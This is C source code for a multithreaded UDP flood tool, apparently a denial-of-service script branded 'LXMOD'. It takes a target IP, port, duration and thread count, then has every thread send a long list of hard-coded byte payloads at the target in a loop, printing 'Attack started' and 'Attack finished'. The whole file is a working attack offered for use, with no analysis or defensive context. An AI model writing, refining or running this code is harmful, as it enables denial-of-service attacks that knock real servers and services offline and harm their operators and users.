#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <time.h>

void usage() {
    printf("Usage: ./Lx ip port time threads\n");
    exit(1);
}

struct thread_data {
    char *ip;
    int port;
    int time;
};

void *attack(void *arg) {
    struct thread_data *data = (struct thread_data *)arg;
    int sock;
    struct sockaddr_in server_addr;
    time_t endtime;

    char *payloads[] = {


"\x3F\x0A\x37\x25\x8D\x3B\x32\x46\x0C\xA2\xB0\x9B\x28\xEE\xC4\xD2\x67\x4D\xE2\x2E\xF5\x01\xA2\xD0\xD4",

"\xF2\x34\x8E\x76\x45\xAC\x1B\x03\xDF\x98\x5E\xA7\x1D\xBC\x90\x29\x73\xB4\x16\xE8",

"\xAF\x02\x89\x4F\xD1\x27\x36\x9A\x5B\xC3\x6E\xF4\x11\xE0\xA9\x73\x82\x5D\xC6\xF8",

"\xD3\x44\x29\xF8\x72\x91\xAF\x38\xC5\xB2\x1D\xA3\x47\x09\xE6\x5A\x7B\xFD\x26\xCB",

"\x1E\x5F\x3C\x82\x14\xB9\x67\xDA\x94\x35\x2B\xC4\xD0\x89\x7E\xF1\x8A\x73\x56\x9D",

"\x9F\x31\x8B\x7C\x45\x12\xD6\xA5\x32\x6F\x98\xF2\x4D\xE3\x1B\xA0\xC7\x5E\x89\x2A",

"\x5E\xF4\xB1\x23\x79\xD8\xA3\xC6\x18\xBD\xF2\x35\x91\x47\x0E\x3C\x72\xA4\xED\xF9",

"\x23\x7E\xB2\x5F\x9A\xC1\x86\xD5\x31\xAF\xE8\x92\x48\xDA\x7B\x5E\xF0\x16\x49\xC7",

"\x4A\x69\x17\xBD\xE5\x91\xC8\x23\x73\x4F\xA7\x9B\x34\xE6\x02\x5D\x8C\xFA\xC3\x12",

"\x3D\x8E\x71\xAF\x9C\x25\x54\xD6\xF8\x43\xE0\xA9\x17\xC2\xBD\x6A\x72\x9E\xF4\x03",

"\x4A\x69\x17\xBD\xE5\x91\xC8\x23\x73\x4F\xA7\x9B\x34\xE6\x02\x5D\x8C\xFA\xC3\x12",

"\x92\xC4\x8E\xF3\xA7\x54\x1D\xBE\x26\x91\xF8\x63\x3A\xD0\x4B\x72\xE9\x5C\x8B\x31",

"\x5F\x28\xD4\x6C\xE2\x17\x9B\x43\x85\xA0\x3C\x9E\x67\xB1\xDE\x25\x4A\xF7\x09\x6D",

"\x3B\x64\xFA\xE1\x82\x57\x19\x4C\x9F\x21\xA8\xD6\x0E\x7B\xC2\x38\xBD\x9A\x43\x76",

"\x84\xE2\x9F\x3C\x5D\x47\xB9\x6A\xF1\x18\xC3\x7E\x02\x35\xAB\xD5\x40\x8D\x1F\x68",

"\x73\xCA\x14\xF8\x39\x7B\xA6\x5D\xE0\x28\x93\x64\xCF\x12\x47\xBD\xE9\x03\x76\x5A",
"\xFC\x48\x2D\xE1\x6B\x97\xC0\x35\xA9\x14\x57\xF2\x8E\x43\x1D\xB0\xE7\x69\xC4\x92",

"\xD8\x36\x7F\xC5\x2B\x9E\x40\xF3\x12\x85\xA6\x58\x9D\x24\xCB\x47\x0A\x65\xE2\x1B",

"\x1C\xE9\x4F\x72\xAD\xB3\xD4\x35\xFA\x26\x83\x5C\xC7\x90\x49\xB8\x13\xEF\x67\xA1",
"\x8F\x42\xD3\x7C\x59\xA5\x18\x34\x9D\xE8\x01\xBC\x27\x53\xF6\x2A\x71\x45\xDE\x88",

"\x95\x2E\xD6\x49\xFC\xA1\x3B\x74\xCB\x05\xB9\x62\x47\xE3\x8D\x13\x57\x9A\xD0\x6C",
"\x7A\xC1\xF5\x09\x3E\xB4\x6F\xD2\x58\x24\x91\x8E\xAD\x47\xBC\x3A\xE0\x5F\x1C\x79",

"\xD7\x64\x3F\x82\xBA\x2C\x91\x0E\xF4\xA8\x5D\x1A\xC9\x76\x34\xBF\x28\x49\xE5\xF2",
"\x6D\xA3\x42\xCE\x59\x18\x87\xE1\xBD\x3A\x74\x0F\x9B\x57\xC8\xD2\x26\x91\x4D\x5A",
"\x52\x8F\xC3\x1E\xA6\x3B\x9D\xF0\x47\x24\xE7\x6A\xB5\x0C\x39\x94\xFB\xD7\x18\x82",

"\xBE\x45\x6A\x31\xDA\x9F\x03\xC7\x5C\xB2\x74\x08\x6E\x93\xEF\x21\x57\x8C\xD1\xA9",
"\x4E\x62\x39\xB8\xD5\x16\x74\xE3\x0A\xBD\xC9\x53\x20\xAD\xF7\x86\x31\x9C\x48\xEB",
"\xC0\x5E\x19\xF2\x7A\xBD\x34\xD6\x9A\x1F\x85\x48\x2E\x97\xEB\x64\xC3\x0F\x59\xA7",

"\x6F\x12\xE0\x5B\x34\xA3\xC8\x91\xF9\x67\x2D\xD4\x0E\xB5\x43\x7F\x9C\x58\xEA\x21",

"\xB1\xDF\x06\x49\x3E\x8D\xFA\x17\xA4\x62\xC5\x98\x0B\x53\x71\xE6\xBD\x2A\x45\x93",
"\x8C\xE5\x79\x2F\xB6\x34\xAD\x1B\x9E\xF4\x6A\x57\xD0\x83\x29\x41\x9C\x5E\xF1\xB8",
"\x6B\x15\xA7\x3D\xFE\x92\x54\x19\x87\x4C\xB3\x21\x5D\xE0\xF9\x68\x42\x9A\x7F\xD5",

"\x14\xE2\xBD\x36\x58\xA9\x03\x77\xC6\x41\xFD\x0E\x83\x95\x6C\x2A\x3F\xB0\xD7\x59",

"\x27\x43\x81\xEA\x59\xBD\x06\xF5\x9F\x2E\xA8\x47\x13\xD2\x7C\x1F\x65\x34\x9E\xF8",

"\x56\x0A\xD8\x27\x93\x4F\xE1\x1C\xAD\x3B\x75\xC4\x09\xB6\x5D\x38\xF0\x82\xCA\x14",
"\xE9\x27\xD3\x90\x69\x3A\xF5\x18\x4C\xAF\x2B\x73\x9D\xB6\xE2\x15\x47\xC0\x8B\x59",

"\x7D\xC2\xF1\x06\x95\x4F\x2A\xBE\x68\x3E\xB9\x5C\x01\x73\xD8\xF4\x46\xAD\x19\xE6",

"\x42\x9F\x1D\x74\x38\xCB\xE0\xB3\x65\x58\xF2\x86\x4A\xD7\x0F\x23\xA9\x9B\x15\xC4",

"\xE5\x6C\xD1\xF9\x32\xA4\x8F\x73\x57\xB0\x1E\x5B\x94\xDA\x29\x48\xE0\x7F\x36\x8C",

"\x4F\x81\xD4\x3A\x6B\x29\xFE\x95\x03\xC6\x54\x18\xBC\x77\x9A\xE3\x21\x5F\xD2\x84",

"\x9E\xA3\x69\xE2\x41\xD6\x13\xBD\x25\x87\x4C\x92\x3F\xF5\x58\x14\xB1\xCA\x70\xE9",

"\x63\x08\x7A\xA6\x35\xC1\x4D\xF7\x82\xBE\x19\x93\xED\x5C\x34\xAF\xD0\x27\x49\xFC",
"\xD3\x7E\xF6\xB8\xA4\x09\xC5\x53\x81\x1A\x6D\x2E\x94\xBC\x3C\xF0\x48\x17\xE5\x72",
"\x39\xC8\xF5\x64\xB0\x21\x97\x2D\xA6\xD4\x5B\x8E\xFE\x43\x8C\x17\xB3\x6F\x09\xD2",
"\x75\x21\xAF\x68\xF1\x39\xDB\x43\xE7\x0C\x54\xC6\x9A\x83\x57\x14\xB8\x6D\x92\xFC",

"\xDA\x08\xB1\x73\xE4\x2A\x9F\x56\x31\xC9\x4E\x7D\x05\xAC\xF8\x19\x82\xD5\x2B\xC3",
"\xAB\x1E\x69\xD8\x57\x3A\xF2\x0D\xC6\xB4\x48\x91\x25\x7C\xE9\x30\x4B\xF7\x02\xDC",
"\x28\xC7\x6F\x35\xE5\x1D\xB9\x90\x4D\x72\xB4\x03\xA1\x59\xFC\xD7\x15\x38\x8A\x9D",
      
    };

    if ((sock = socket(AF_INET, SOCK_DGRAM, 0)) < 0) {
        perror("Socket creation failed");
        pthread_exit(NULL);
    }

    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(data->port);
    server_addr.sin_addr.s_addr = inet_addr(data->ip);

    endtime = time(NULL) + data->time;

    while (time(NULL) <= endtime) {
        for (int i = 0; i < sizeof(payloads) / sizeof(payloads[0]); i++) {
            if (sendto(sock, payloads[i], strlen(payloads[i]), 0,
                       (const struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
                perror("Send failed");
                close(sock);
                pthread_exit(NULL);
            }
        }
    }

    close(sock);
    pthread_exit(NULL);
}

int main(int argc, char *argv[]) {
    if (argc != 5) {
        usage();
    }

    char *ip = argv[1];
    int port = atoi(argv[2]);
    int time = atoi(argv[3]);
    int threads = atoi(argv[4]);
    pthread_t *thread_ids = malloc(threads * sizeof(pthread_t));
    struct thread_data data = {ip, port, time};

    printf("Attack started on %s:%d for %d seconds with %d threads\n", ip, port, time, threads);

    for (int i = 0; i < threads; i++) {
        if (pthread_create(&thread_ids[i], NULL, attack, (void *)&data) != 0) {
            perror("Thread creation failed");
            free(thread_ids);
            exit(1);
        }
        printf("Launched thread with ID: LXMOD %lu\n", thread_ids[i]);
    }

    for (int i = 0; i < threads; i++) {
        pthread_join(thread_ids[i], NULL);
    }

    free(thread_ids);
    printf("Attack finished join @LXMOD\n");
    return 0;
}
